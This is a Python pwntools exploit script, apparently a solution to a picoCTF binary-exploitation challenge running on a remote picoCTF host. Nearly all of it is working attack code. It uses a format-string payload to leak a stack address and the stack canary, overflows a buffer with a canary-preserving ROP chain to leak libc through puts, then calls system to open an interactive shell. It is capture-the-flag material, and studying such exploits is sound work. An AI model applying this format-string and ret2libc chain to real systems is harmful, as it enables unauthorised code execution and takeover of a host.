from pwn import *  # Import pwntools


####################
#### CONNECTION ####
####################
LOCAL = False
REMOTETTCP = True
REMOTESSH = False
GDB = False

LOCAL_BIN = './vuln'
REMOTE_BIN = '~/vuln' #For ssh

if LOCAL:
    P = process(LOCAL_BIN) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTETTCP:
    P = remote('jupiter.challenges.picoctf.org',15815) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTESSH:
    ssh_shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
    p = ssh_shell.process(REMOTE_BIN) # start the vuln binary
    elf = ELF(LOCAL_BIN)# Extract data from binary
    rop = ROP(elf)# Find ROP gadgets

if GDB and not REMOTETTCP and not REMOTESSH:
    # attach gdb and continue
    # You can set breakpoints, for example 'break *main'
    gdb.attach(P.pid, 'b *0x080487aa')





##########################
##### HELPER FUNCTs ######
##########################

def getWin(i):
	
	while True:
		P.sendline(str(i).encode())
		receive = P.recvline()
		P.recvline()
		P.recvline()
		print(receive)
		if b'Nope!' not in receive:
			break
		i=i+1

#####################
#### Find Gadgets ###
#####################

#POP_RAX_ADDR = (ROP_LOADED.find_gadget(['pop rax', 'ret']))[0]



##############################
##### FINAL EXPLOITATION #####
##############################

P.recvline()
P.recvline()
P.recvline()
P.recvline()
i=(-4095+112)
getWin(i)
P.sendline(b'%p.%p.%119$p')
P.recvuntil(b'0x200.')
leak = int(P.recvuntil(b'.').strip(b'.'),16)
canary = int(P.recvline().strip(),16)
print('leak:', hex(leak))
print('Canary:', hex(canary))
P.clean()
i=(-4095+111)
getWin(i)
P.sendline(b'A'*448+p32(canary)+b'A'*(512-448-4)+p32(canary)+b'A'*(12)+p32(ELF_LOADED.plt['puts'])+p32(ELF_LOADED.sym['win'])+p32(ELF_LOADED.got['puts']))
P.recvuntil(b'Congrats:')
P.recvline()
print(P.recvline())
leak2 = u32(P.recv(4))
libc_base = leak2 - 0x067460# 
libc_system = libc_base + 0x03ce10# 

print('leak:', hex(leak2))
print('libc base:', hex(libc_base))
print('libc system:', hex(libc_system))
P.sendline(b'A'*448+p32(canary)+b'A'*(512-448-4)+p32(canary)+b'A'*(12)+p32(libc_system)+p32(ELF_LOADED.sym['win'])+p32(libc_base+0x17b88f))
P.interactive()

P.interactive() #Interact with your shell :)
